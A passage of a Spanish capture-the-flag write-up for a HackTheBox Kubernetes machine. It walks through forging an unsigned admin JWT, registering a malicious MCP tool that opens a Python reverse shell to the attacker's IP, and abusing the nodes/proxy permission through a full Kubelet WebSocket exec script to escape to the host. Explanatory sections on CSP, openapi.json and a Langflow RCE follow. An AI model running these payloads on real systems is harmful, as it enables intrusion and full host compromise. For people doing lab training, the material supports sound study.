import base64, json

def base64Url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

token = base64Url(json.dumps({"alg":"none","typ":"JWT"}).encode()) + '.'
token += base64Url(json.dumps({"sub":"hacker","role":"admin"}).encode()) + '.'

print(token)
```

2. Podemos usar las propias herramientas de la línea de comandos:

```bash
# Generamos la cabecera primero
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=' > jwt_new && echo -n '.' >> jwt_new


# Luego generamos el Payload
echo -n '{"sub": "hacker", "role": "admin"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=' >> jwt_new && echo -n '.' >> jwt_new
```

3. Podemos usar herramientas online como ***[jwt.io/](https://www.jwt.io/)***.

#### <font color=red>[-]</font> Registrando una herramienta maliciosa

Ahora con el nuevo JWT que acabamos de forjar, usaremos el *endpoint* `/POST /api/v1/tools` que requería de permisos de administrador.

>Necesitamos registrar una herramienta capaz de ejecutar código con la que obtener una reverse shell.

Para comprobar que todo funciona correctamente, primero crearemos una herramienta  de prueba que realizará un `ping` desde la víctima hacia nuestra máquina atacante. Para ello:

###### 1. Registramos la herramienta en el *endpoint* `POST /api/v1/tools`

Antes de nada, debemos conocer los campos y cabeceras necesarias para poder interactuar con el *endpoint* `/POST /api/v1/tools`:

```bash
# Consultamos la documentación de la API en /openapi.json
curl -s http://localhost:30080/openapi.json | jq
```

```json
"/api/v1/tools": {
      "post": {
        "summary": "Register Tool",
        "operationId": "register_tool_api_v1_tools_post",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "$ref": "#/components/schemas/ToolRegisterRequest"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {
                  "additionalProperties": {
                    "type": "string"
                  },
                  "type": "object",
                  "title": "Response Register Tool Api V1 Tools Post"
                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        },
        "security": [
          {
            "HTTPBearer": []
          }
        ]
      }
    },
```

En esta sección de la salida, podemos ver que la petición POST al *endpoint* `POST /api/v1/tools`, requiere de una cabecera que especifique el formato de los datos de entrada `JSON`, que podemos encontrar los campos requeridos en la sección `#/components/schemas/ToolRegisterRequest` y que debe de llevar el token JWT.

Si vamos a la sección `#/components/schemas/ToolRegisterRequest`:

```json
"components": {
    "schemas": {
      "ToolRegisterRequest": {
        "properties": {
          "name": {
            "type": "string",
            "title": "Name"
          },
          "description": {
            "type": "string",
            "title": "Description"
          },
          "inputSchema": {
            "anyOf": [
              {
                "additionalProperties": true,
                "type": "object"
              },
              {
                "type": "null"
              }
            ],
            "title": "Inputschema"
          },
          "code": {
            "type": "string",
            "title": "Code"
          }
        },
        "type": "object",
        "required": [
          "name",
          "description",
          "code"
        ],
        "title": "ToolRegisterRequest"
      },
    },
    "securitySchemes": {
      "HTTPBearer": {
        "type": "http",
        "scheme": "bearer"
      }
    }
  }
```

Encontramos que los campos necesarios para poder registrar una herramienta son `name`, `description`, `code`.

Conociendo la estructura que debe tener la petición `POST`, estamos listos para registrar nuestra herramienta de la siguiente forma:

```bash
curl -s -X POST http://localhost:30080/api/v1/tools \
> -H "Content-Type: application/json" \
> -H "Authorization: Bearer $JWT" \
> -d '{"name":"ping","description":"ping to test","code":"import os; os.system(\"ping -c 2 IP_KALI\")"}'
```

###### 2. Comprobamos que la herramienta ahora esté en la lista de herramientas

```bash
curl -s http://localhost:30080/api/v1/tools | jq

[
  {
    "name": "ping_host",
    "description": "Ping a target host 3 times and return ICMP output."
  },
  {
    "name": "get_metrics_summary",
    "description": "Return a summary of system memory and load average from /proc."
  },
  {
    "name": "list_running_tasks",
    "description": "List the top 20 running processes sorted by CPU usage."
  },
  {
    "name": "ping",     # AQUÍ ESTÁ
    "description": "ping to test"
  }
]
```

###### 3. Verificamos que se ejecute la herramienta correctamente

```bash
# 1. En nuestra máquina atacante ponemos tcpdump a escuchar el protocolo icmp por la interfaz de la VPN
sudo tcpdump -i tun0 icmp
```

>[!important]
>***El formato que debemos utilizar para comunicarnos con el endpoint `POST /mcp` proviene de la combinación de estas dos espcificaciones:***
>
>***1. La especificación base: JSON-RPC 2.0***
>
>Dado que el *endpoint* `POST /mcp` indica explícitamente `[MCP JSON-RPC 2.0]` (*en `/api/v1/version`*), la "envoltura" del mensaje debe cumplir con este estándar (RFC y especificaciones de ***jsonrpc.org***). Todo mensaje válido debe incluir obligatoriamente:
>
>- `"jsonrpc":"2.0"`
>- `"id"`: Identificador para correlacionar la respuesta.
>- `"method"`: Nombre de la acción a ejecutar.
>- `"params"`: Objeto con los parámetros de la acción.
>
>***2. La especificación del protocolo: Model context Protocol (MCP)***
>
>MCP es un estándar abierto impulsado por *Anthropic*. Si visitamos la documentación oficial de MCP (en *modelcontextprotocol.io* o su repositorio en GitHub), veremos que define los nombres exactos de los métodos (`method`) que los clientes y servidores deben usar para comunicarse.
>
>Para interactuar con herramientas, el estándar MCP define el método `tools/call`. La documentación oficial exige que dentro de `params` se envíe el nombre de la herramienta  (`name`) que los clientes y servidores deben usar para comunicarse.
>
>Al unir ambos manuales, obtenemos la plantilla estándar universal que cualquier cliente MCP usaría legítimamente:
>
>```JSON
>{
>	"jsonrpc": "2.0",
>	"id": "cualquier_identificador",
>	"method": "tools/call",
>	"params": {
>		"name": "nombre_de_la_herramienta_registrada",
>		"arguments": {
>			"clave_del_parametro": "valor_del_parámetro"
>		}
>	}
>}
>```
>
>***Conociendo todo esto, estamos listos para realizar la petición correcta al endpoint `POST /mcp`***

```bash
# 2. En la máquina víctima realizamos la petición para ejecutar la hheramienta que acabamos de crear
curl -s -X POST http://localhost:30080/mcp \
> -H "Content-Type: application/json" \
> -H "Authorization: Bearer $JWT" \
> -d '{"jsonrpc":"2.0","id":"4","method":"tools/call","params":{"name":"ping","arguments":{}}}'
```

Si revisamos el tráfico desde `tcpdump`, veremos que hemos recibido 2 `icmp echo request` desde la IP de la víctima.

```
16:13:50.448715 IP fireflow.htb > 10.10.15.189: ICMP echo request, id 46967, seq 1, length 64
16:13:50.448743 IP 10.10.15.189 > fireflow.htb: ICMP echo reply, id 46967, seq 1, length 64
16:13:51.451001 IP fireflow.htb > 10.10.15.189: ICMP echo request, id 46967, seq 2, length 64
16:13:51.451016 IP 10.10.15.189 > fireflow.htb: ICMP echo reply, id 46967, seq 2, length 64
```

De esta forma comprobamos que podemos ejecutar comandos del servidor a través de este *endpoint*.

##### <font color=red>[!]</font> Obteniendo una reverse shell

Ahora creemos la herramienta que nos devolverá una reverse shell a nuestra máquina:

###### 1. Registramos la herramienta maliciosa

```bash
# Opción 1
curl -s -X POST http://localhost:30080/api/v1/tools -H "Content-Type: application/json" -H "Authorization: Bearer $JWT" -d '{"name":"shell","description":"getting the reverse shell","code":"import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(1)\ns=socket.socket()\ns.connect((\"IP_KALI\",5555))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"}'
```

>[!important]
>***[Reverse Shell con técnica de doble fork](#reverse_shell_con_técnica_de_doble_fork)***

###### 2. Ejecutamos la herramienta

```bash
curl -s -X POST http://localhost:30080/mcp -H "Content-Type: application/json" -H "Authorization: Bearer $JWT" -d '{"jsonrpc":"2.0","id":"5","method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

##### 3. Mejorar la Shell

Al recibir la conexión, debemos usar el siguiente comando `python3 -c "import pty;pty.spawn('/bin/bash')"` para estabilizar la shell y definir la variable de entorno TERM para poder usar herramientas como `clear`:

```bash
export TERM=xterm
```

## <font color=red>[~]</font> Kubernetes

### <font color=red>[-]</font> Hipótesis visual (Hostname)

Al obtener la shell interactiva, el prompt revela que el nombre del sistema es `mcp-server-54464cb475-29ztf`. Este patrón alfanumérico segmentado es la firma estándar de ***Kubernetes*** para nombrar a sus Pods:

- `mcp-server`: Nombre de la aplicación o despliegue (*Deployment*)
- `54464cb475`: Hash que identifica al grupo de réplicas (*ReplicaSet*)
- `29ztf`: Identificador aleatorio y único de esa instancia exacta del contendor (***Pod***)

>[!Note]
>*Un* ***Pod*** *es la unidad más pequeña y fundamental que se puede crear y gestionar en* ***Kuberenetes***.
>
>*Funciona como un envoltorio lógico que agrupa uno o más contenedores (como los de **Docker**) que necesitan trabajar estrechamente en conjunto. La característica clave de un **Pod** es que todos los contenedores en su interior comparten los mismos recursos: tienen la misma dirección IP, el mismo espacio de red y pueden acceder a los mismos volúmenes de almacenamiento. En la práctica, se comportan como si estuvieran corriendo juntos dentro de una máquina física o virtual.*

### <font color=red>[-]</font> Confirmación técnica (Service Account)

Basándonos en la sospecha visual, el paso lógico de un auditor es verificar si el sistema inyectó las credenciales por defecto. Al comprobar la existencia de la ruta `/var/run/secrets/kubernetes.io/serviceaccount/` y encontrar el archivo `token`, pasamos de una sospecha a una confirmación técnica absoluta de que estamos dentro de un clúster de ***Kubernetes***, obteniendo además la llave para hablar con su API.

### <font color=red>[-]</font> Enumeración de privilegios en Kubernetes (RBAC)

Una vez confirmado el entorno y extraído el token del ***Service Account***, el siguiente paso metodológico es descubrir qué nivel de acceso nos otorga esta credencial dentro del clúster.

>En lugar de intentar acceder a recursos a ciegas, la API de Kubernetes ofrece un *endpoint* específico diseñado para auditar permisos: `SelfSubjectRulesReview`.

Al enviar una petición web a este *endpoint* adjuntando nuestro token como cabecera de autenticación, podemos forzar al clúster a que nos devuelva un desglose exacto de las acciones y recursos que este contenedor está autorizado a utilizar.

#### <font color=red>[-]</font> Consulta a la API de Kubernetes

Para interrogar al clúster, construimos una petición HTTP POST dirigida al *endpoint* de autorización. Utilizamos el token inyectado en el contenedor para autenticarnos (pasándole en la cabecera `Authorization`) y solicitamos una revisión de nuestras reglas enviando un objeto JSON formal:

```bash
curl -s -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Content-Type: application/json" -H "Authorization: Bearer $JWT" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' -i -k
```

```JSON
{
  "kind": "SelfSubjectRulesReview",
  "apiVersion": "authorization.k8s.io/v1",
  "metadata": {},
  "spec": {},
  "status": {
    "resourceRules": [
      {
        "verbs": [
          "create"
        ],
        "apiGroups": [
          "authorization.k8s.io"
        ],
        "resources": [
          "selfsubjectaccessreviews",
          "selfsubjectrulesreviews"
        ]
      },
      {
        "verbs": [
          "create"
        ],
        "apiGroups": [
          "authentication.k8s.io"
        ],
        "resources": [
          "selfsubjectreviews"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "apiGroups": [
          ""
        ],
        "resources": [
          "nodes/proxy"
        ]
      }
    ],
    "nonResourceRules": [
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/.well-known/openid-configuration",
          "/.well-known/openid-configuration/",
          "/openid/v1/jwks",
          "/openid/v1/jwks/"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/api",
          "/api/*",
          "/apis",
          "/apis/*",
          "/healthz",
          "/livez",
          "/openapi",
          "/openapi/*",
          "/readyz",
          "/version",
          "/version/"
        ]
      },
      {
        "verbs": [
          "get"
        ],
        "nonResourceURLs": [
          "/healthz",
          "/livez",
          "/readyz",
          "/version",
          "/version/"
        ]
      }
    ],
    "incomplete": false
  }
}
```

#### <font color=red>[-]</font> Análisis de la respuesta (Identificación de la vulnerabilidad)

El clúster valida nuestra identidad y responde con un JSON que detalla exactamente qué acciones (`verbs`) tenemos permitidas sobre qué componentes (`resources`). Al analizar la respuesta, identificamos una mala configuración crítica asignada a nuestro ***Service Account***:

```JSON
{
  "kind": "SelfSubjectRulesReview",
  "apiVersion": "authorization.k8s.io/v1",
  "status": {
    "resourceRules": [
      {
        "verbs": [
          "get"
        ],
        "apiGroups": [
          ""
        ],
        "resources": [
          "nodes/proxy"
        ]
      }
    ],
    "incomplete": false
  }
}
```

##### <font color=red>[>]</font> Impacto de `nodes/proxy`

El hallazgo de este permiso es el punto de inflexión de la máquina. El recurso `nodes/proxy` nos autoriza a utilizar la API principal de Kubernetes como un túnel para comunicarnos directamente con el servicio ***Kubelet*** subyacente (puerto `10250`). El ***Kubelet*** es el agente que administra físicamente los contenedores del servidor. Al tener acceso a él, podemos saltarnos las restricciones de nuestro propio ***Pod*** e invocar acciones administrativas, como listar todos los contenedores en ejecución en la máquina y, lo que es más peligroso, ejecutar comandos dentro de ellos.

#### <font color=red>[-]</font> Identificación de la IP del Nodo Objetivo

Antes de interactuar con el ***Kubelet***, es importante justificar hacia dónde dirigimos nuestro ataque. Para poder comunicarnos con el servicio ***Kubelet*** debemos apuntra directamente a la IP principal que estamos auditando (*la que nos da HackTheBox al principio*) por las siguientes razones arquitectónicas:

1. ***Arquitectura de Nodo Único (Sigle-Node Cluster):***
   En entornos de laboratorio como *HackTheBox*, es estándar utilizar implementaciones ligeras de kubernetes (como ***K3s*** o ***MicroK8s***) donde un único servidor asume todos los roles. La máquina virtual `fireflow` actúa simultáneamente como el plano de control (donde reside la API) y como el nodo de trabajo (donde se ejecutan los contenedores). Por lo tanto, el nodo físico que aloja nuestro contenedor es la propia máquina objetivo.
2. ***Exposición del Kubelet:***
   El ***Kubelet*** es un binario que no corre dentro de un contenedor, sino directamente sobre el sistema operativo de la máquina anfitriona. Por defecto, expone su API en el puerto `10250` escuchando en las interfaces principales del servidor.
3. ***Enrutamiento de Red (Egress):***
   Aunque nuestra *Reverse Shell* está atrapada en el espacio de red aislado del Pod (con una IP interna de rengo diferente), el enrutamiento interno de Kubernetes permite el tráfico de salida (***egress***) hacia la red local o externa. Esto significa que desde dentro del contenedor podemos comunicarnos sin problema con la IP pública/principal del nodo anfitrión.

Al conocer la IP de la máquina desde la fase de reconocimiento inicial, podemos prescindir de realizar técnicas de descubrimiento de red interna y apuntar directamente nuestro ataque directamente al puerto `10250` de esta dirección.

##### <font color=red>[?]</font> Redes de Kubernetes: ClusterIP vs NodeIP

Aunque todo esté corriendo en el mismo servidor de metal (o una máquina virtual), desde la perspectiva de la red, los servicios se comportan de manera diferente:

1. ***La API de Kubernetes (`10.43.0.1`): El "teléfono interno"***
   Esa IP no es "real" ni pertenece a ninguna tarjeta de red física. Es una ***ClusterIP*** (*una IP virtual*) que crea la red definida por software (***SDN***) de Kubernetes.
   
   Para que los contenedores no tengan que salir a la red externa de la empresa para hablar con el clúster, Kubernetes levanta un servicio interno en esa IP virtual. Cuando nuestro contenedor envía una petición a `10.43.0.1`, las reglas internas del servidor (*iptables*) interceptan ese tráfico y lo redirigen de forma invisible al proceso real de la API (que suele estar escuchando en el puerto `6443` del servidor). Los atacantes usamos esta IP porque Kubernetes nos la deja en bandeja de plata en las variables de entorno (`env | grep KUBERNETES`).
2. ***El Kubelet (`IP_VICTIMA_INICIAL`): El "teléfono externo"***
   El ***Kubelet*** es diferente. No es un contendor ni un servicio virtual. Es un proceso nativo de Linux (un demonio de `systemd`) que se ejecuta directamente sobre el sistema operativo del anfitrión.
   
   Su trabajo es gestionar la máquina real. Por lo tanto, no se esconde detrás de una IP virtual interna; se "ata" (*bindea*) directamente a la tarjeta de red física del servidor escuchando en el puerto `10250`.

###### Resumen

Usamos la IP `10.43.0.1` para hablar con la API porque es el enrutamiento virtual por defecto que nos ofrece el interior del contenedor. Sin embargo, para contactar al ***Kubelet***, debemos salir de esa burbuja virtual y apuntar directamente a la IP real del servidor, ya que el ***Kubelet*** es un proceso del sistema anfitrión y no un servicio dentro de una malla virtual de Kubernetes.

>[!Note]
>*Técnicamente, podríamos haber intentado hablar con la API apuntando a `https://$IP:6443`, pero usar la IP interna que ya nos da el entorno es el camino más rápido y con menos probabilidades de ser bloqueado por un firewall externo.*
>
>```bash
>curl -sk -X POST https://$IP:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Content-Type: application/json" -H "Authorization: Bearer $JWT" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
>```
>
>```json
>{
>  "kind": "SelfSubjectRulesReview",
>  "apiVersion": "authorization.k8s.io/v1",
>  "metadata": {},
>  "spec": {},
>  "status": {
>    "resourceRules": [
>      {
>        "verbs": [
>          "get"
>        ],
>        "apiGroups": [
>          ""
>        ],
>        "resources": [
>          "nodes/proxy"
>        ]
>      },
>      <snip>
>```

#### <font color=red>[-]</font> Abuso del Kubelet y Búsqueda de Pods Privilegiados

Con el permiso `nodes/proxy` confirmado, nuestro token tiene la autoridad necesaria para autenticarse contra el servicio ***Kubelet***, el cual expone su API en el puerto `10250` del nodo principal que atacamos (*la IP que nos da HackTheBox al principio*). El ***Kubelet*** cuenta con un *endpoint* `/pods` que devuelve un JSON masivo con la configuración en tiempo real de todos los contenedores que se están ejecutando en la máquina.

##### <font color=red>[>]</font> Enumeración de vías de escape directas (*Vulnerabilidades de Container Breakout*)

1. ***Falta de montajes del host (Volumes):*** Si ejecutamos `mount` o `df -h` dentro de nuestra shell de `mcp`, veremos que el sistema de archivos es el estándar del contenedor (`overlayfs`). No hay ninguna carpeta de la máquina `fireflow` (como `/` o `/etc`) montada dentro de nuestra jaula.
2. ***Falta de capacidades (Linux Capabilities):*** En Linux, el usuario `root` se divide en "capacidades". Por defecto, Docker y Kubernetes eliminan las más peligrosas. Si miramos nuestras capacidades (ejecutando `capsh --print` o revisando `/proc/self/status`), veremos que no tenemos `CAP_SYS_ADMIN` o `CAP_SYS_MODULE`. Sin ellas, no podemos montar discos duros, ni cargar módulos del kernel para escapar.
3. ***Ausencia de modo privilegiado:*** Al no tener esas capacidades ni acceso a los dispositivos del host (en la carpeta `/dev`), confirmamos que le contendor no se ejecutó con la bandera `privileged: true`.

>***Conclusión lógica***
>Al estar en un contenedor estándar (aislado de forma segura por defecto), **no podemos escapar atacando al sistema operativo**. Nuestros comandos locales no nos sirven para salir. La única superficie de ataque que nos queda es **la red**, es decir, usar nuestro token para manipular la infraestructura de Kubernetes desde fuera de nuestro propio contenedor.

Dado que nuestro contenedor actual está fuertemente aislado, el objetivo cambia: en lugar de intentar un escape directo, buscaremos un contenedor vecino que ya tenga acceso a la máquina anfitriona para "secuestrarlo". Para automatizar la lectura del JSON, lanzamos una petición con `curl` y la filtramos con Python buscando dos vulnerabilidades de configuración:

1. `securityContext.privileged: true`: Contenedores que corren sin las restricciones de seguridad habituales de Linux (AppArmor, Seccomp, etc).
2. `hostPath`: Contenedores que tienen discos o carpetas de la máquina real (host) montadas en su interior.

```bash
curl -sk "https://10.129.6.42:10250/pods" \
-H "Authorization: Bearer $JWT" \
| python3 -c "
import sys,json
data=json.load(sys.stdin)
for item in data['items']:
    ns=item['metadata']['namespace']
    name=item['metadata']['name']
    vols=[v for v in item['spec'].get('volumes',[]) if 'hostPath' in v]
    for c in item['spec']['containers']:
        if c.get('securityContext',{}).get('privileged') and vols:
            paths=[v['hostPath']['path'] for v in vols]
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"

[!] PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq - container: node-exporter - hostPaths: ['/proc', '/sys', '/']
```

##### <font color=red>[>]</font> Análisis del Vector de Escape (Contenedor Objetivo)

El script desarrollado nos devuelve un resultado crítico. Hemos identificado un contenedor vulnerable que cumple con todos los requisitos para realizar un *Container Escape (escape de contendor)*. Desglosamos la salida obtenida:

- `monitoring/prometheus-prometheus-node-exporter-nmntq` (***El Objetivo***):
  Nos indica el *namespace* (`monitoring`) y el nombre exacto del Pod. "*Node Exporter*" es una herramienta muy común del ecosistema de Prometheus. Su función en la vida real es recolectar métricas de rendimiento (CPU, disco, memoria) del servidor físico donde se ejecute.
- `PRIVILEGED` (***Las Defensas Bajadas***):
  Para que Node Exporter pueda leer las métricas de la máquina real, los administradores suelen desplegarlo con la etiqueta `securityContext.privileged: true`. Esto significa que el contendor se ejecuta sin las restricciones de seguridad habituales del motor de contenedores (***AppArmor***, ***Seccomp***, etc), dándole un acceso casi directo al hardware y al kernel del anfitrión.
- `hostPaths: ['/proc', '/sys', '/']` (***El puente de Salida***):
  Esta es la vulnerabilidad definitiva. Un `hostPath` es una configuración que monta una carpeta del disco duro real de la máquina (`fireflow`) dentro del sistema de archivos virtual del contenedor. Vemos que tiene montado `/proc` (*información de procesos del host*), `/sys` (dispositivos del kernel) y, lo más catastrófico, `/` (***la raíz completa del disco duro del servidor***).

>***Conclusión del hallazgo:***
>Este contenedor tiene todo el disco duro de la máquina anfitriona conectado a su interior. Si utilizamos nuestro permiso `nodes/proxy` para forzar a la API del Kubelet a ejecutar un comando dentro de este contenedor `node-exporter`, podremos navegar por el disco real de `fireflow`, acceder a `/root` y leer la bandera, evadiendo por completo nuestro aislamiento inicial.

### <font color=red>[-]</font> Ejecución Remota de comandos (RCE) vía WebSockets

Una vez identificado el contenedor vulnerable (`node-exporter`), el siguiente paso es inyectar un comando en su interior. Aunque nuestro token tiene permisos para usar el *endpoint* de ejecución (`exec`) del ***Kubelet***, la arquitectura de Kubernetes no permite ejecutar comandos mediante peticiones HTTP tradicionales (como un simple `curl GET` o `POST`).

Para mantener una sesión interactiva y poder recibir la salida del comando (*Standard Output/Error*), la API de Kubernetes exige que la conexión HTTP inicial se "actualice" (*Upgrade*) a una conexión persistente bidireccional usando el protocolo ***WebSockets*** (o SPDY).

Dado que `curl` no maneja bien flujos interactivos de WebSockets con la multiplexación que exige Kubernetes (donde los canales de entrada, salida y error van separados por bytes de control), utilizamos un script en Python (`kube_exec.py`) (Se obtuvo el código del writeup de [Pasindu](https://pasindu-sd.github.io/writeups-blog/HackTheBox---Machines/Linux/Medium/Fireflow---Complete-Walkrhrough)).

```python
cat > /tmp/kube_exec.py << 'EOF'
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
 
NODE = "IP_VICTIMA"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'
 
async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
           f"?output=1&error=1&{args}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass
 
asyncio.run(ws_exec(COMMAND.split()))
EOF
```

#### <font color=red>[-]</font> Lógica del ataque con `kube_exec.py`

1. ***Autenticación:*** El script lee nuestro token del ***Service Account*** y lo inyecta en la cabecera HTTP.
2. ***Negociación del Protocolo:*** Se conecta al puerto `10250` del Kubelet (o a través del proxy de la API) solicitando un *Upgrade* a WebSocket.
3. ***Inyección del Comando:*** Envía la instrucción exacta apuntando al *namespace* `monitoring`, al pod `prometheus-prometheus-node-exporter-nmntq` y al contenedor `node-exporter`.
4. ***Escape (La ruta de la bandera):*** Como vimos en la enumeración, el disco duro del anfitrión (`/`) está montado dentro del contenedor (generalmente en una ruta como `/host` o `/rootfs`). Por tanto, el comando que le pasamos al script no es `cat /root/root.txt`, sino `cat /host/root/root/root.txt`, aprovechando el puente físico entre el contendor y la máquina real.

>[!important]
>*Es posible que tengamos que instalar el módulo `websockets` de Python para que el código funcione correctamente.*

#### <font color=red>[-]</font> Ejecución del Exploit

```bash
python3 kube_exec.py "comando_a_ejecutar"
```

De esta forma logramos evadir el aislamiento del contenedor inicial, abusar del sistema de control de acceso de Kubernetes (RBAC) y comprometer la integridad de la máquina anfitriona `fireflow`, obteniendo la bandera del administrador.

---

# Explicación

## X-Frame-Options

>La cabecera `X-Frame-Options` es un mecanismo de seguridad que le indica al navegador si se le permite renderizar una página web dentro de un `<frame>`, `<iframe>`, `<embed>` u `<object>`.

Sin esta protección, un atacante puede cargar una web legítima (por ejemplo, el panel de transferencias de un banco) dentro de un *iframe* transparente superpuesto en una página maliciosa. Cuando la víctima hace clic en un botón falso visible (como "*Gana un premio!*"), en realidad está haciendo clic en el botón de "Transferir fondos" del *iframe* invisible.

La cabecera funciona devolviendo uno de estos dos valores estrictos:

- `DENY`: La página no puede mostrarse en un *iframe* bajo ninguna circunstancia, ni siquiera si la petición proviene del mismo sitio web. Es la configuración más agresiva y segura.
- `SAMEORIGIN`: La página solo puede incrustarse si el sitio que intenta cargar el *iframe* pertenece al mismo origen (mismo protocolo, dominio y puerto).

>Existía una tercera opción (`ALLOW-FROM uri`), pero está obsoleta y la mayoría de los navegadores modernos ya no la soportan.

Hoy en día, aunque `X-Frame-Options` sigue siendo muy común y efectiva, el estándar de la industria es complementarla o sustituirla por la cabecera **Content-Security-Policy (CSP)** utilizando la directiva `frame-ancestors`. Esta directiva moderna es mucho más flexible porque te permite crear listas blancas de múltiples dominios externos autorizados para incrustar tu contenido.

## El problema de la página en blanco

Al intentar visitar la ruta `/docs` en el navegador para interactuar con la API, la página cargaba completamente en blanco. El motivo se encuentra en la estricta cabecera de seguridad configurada en el servidor:

```
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;
```

Esta directiva CSP (`default-src 'self'`) prohíbe al navegador cargar recursos que no provengan del propio dominio. Sin embargo, el código HTML de Swagger intenta importar sus dependencias desde un CDN externo (`https://cdn.jsdelivr.net`). Como resultado, el navegador bloquea los scripts por seguridad y la interfaz gráfica falla silenciosamente.

>[!important]
>Podemos corroborar esto si abrimos el *endpoint* `/docs` en el navegador y cuando nos aparezca la página en blanco pulsamos `F12` y miramos la consola. Aquí podremos ver varios errores por ***CSP (Content-Security-Policy)***.

## openapi.json

>***OpenAPI*** (anteriormente conocido como ***Swagger***) es un estándar global para describir el funcionamiento de las ***APIs RESTful***. El archivo `openapi.json` es simplemente un documento en formato JSON que actúa como un ***manual de instrucciones*** de esa API para que las máquinas y los humanos puedan entenderla.

### Qué información contiene?

Si logramos leer un archivo `openapi.json`, encontraremos una lista estructurada con:

- ***Todos los endpoints disponibles:*** Las rutas a las que podemos enviar peticiones (ej. `/api/v1/auth`, `api/v1/tools`).
- ***Métodos HTTP permitidos:*** Si una ruta acepta `GET`, `POST`, `PUT`, `DELETE`, etc.
- ***Parámetros y esquemas:*** Qué datos exactos espera recibir el servidor (ej, "necesita un JSON con un campo `username` y otro `password`").
- ***Métodos de autenticación:*** Cómo está protegida la API (por ejemplo, si usa tokens JWT en la cabecera `Authorization`).

### Por qué es tan importante en un ataque?

Durante la fase de enumeración de una web, descubrir la ruta `/openapi.json` (o la interfaz visual en `/docs` o `/swagger`) nos ahorra muchísimo tiempo.

En lugar de tener que enviar peticiones a ciegas (fuzzing) o adivinar cómo interactuar con el servidor, este archivo nos entrega el ***mapa completo de la superficie de ataque***. En el caso de este laboratorio, gracias a que pudimos leer esta documentación, supimos exactamente qué estructura JSON debiamos enviar para autenticarnos y cómo registrar una herramienta maliciosa posteriormente.

## CVE-2026-33017

### Qué tipo de fallo es?

Se trata de una vulnerabilidad crítica de ***Ejecución Remota de Código (RCE)*** que no requiere autenticación. Esto significa que un atacante anónimo en internet puede lograr que el servidor ejecute comandos del sistema operativo sin necesitar una cuenta, un usuario ni contraseña.

### Causa raíz

El problema reside en cómo el *backend* de *Langflow* (versiones anteriores a la `1.8.3`) procesa la previsualización de los flujos de trabajo.

*Langflow* expone un endpoint específico de su API REST diseñado para esto: `POST /api/v1/build_public?tmp/{flow_id}/flow`

El fallo de diseño humano aquí es gravísimo: cuando un usuario envía datos a este *endpoint* (que incluyen parámetros o configuraciones para probar el flujo), el servidor recoge esos datos y los pasa directamente a una función nativa de Python llamada `exec()`.

>[!warning]
>La función `exec()` en Python se utiliza para ejecutar código Python dinámicamente a partir de una cadena de texto. Si los desarrolladores no implementan una limpieza estricta (*sanitización*) o un entorno *sandbox* antes de meter datos de un usuario en un `exec()`, están abriendo la puerta de par en par.

### El vector de ataque

>Para explotar este fallo el atacante solo necesita una pieza del rompecabezas: ***un `flow_id` válido***

El ataque funciona así:

1. El atacante crea una petición HTTP POST dirigida a ese *endpoint* vulnerable, usando el `flow_id` válido para que la API acepte la petición.
2. Dentro del *payload*, en lugar de enviar configuraciones normales, inyectamos código malicioso en Python (por ejemplo, un script para crear una *Reverse Shell*).
3. La API recibe el texto, asume que es seguro, se lo pasa a la función `exec()`, y el servidor ejecuta nuestro código malicioso con los privilegios del usuario que está corriendo la aplicación (generalmente `www-data` u otro usuario de servicio).

```
https://github.com/EQSTLab/CVE-2026-33017
```

## Puerto 30080

Cuando miramos los puertos con servicios escuchando en la máquina no encontramos el puerto:

```bash
ss -tuln

Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process     

tcp              LISTEN            0                 4096                             127.0.0.1:10010                            0.0.0.0:*                                  
tcp              LISTEN            0                 2048                             127.0.0.1:7860                             0.0.0.0:*                                  
tcp              LISTEN            0                 511                                0.0.0.0:443                              0.0.0.0:*                                  
tcp              LISTEN            0                 4096                               0.0.0.0:22                               0.0.0.0:*                                  
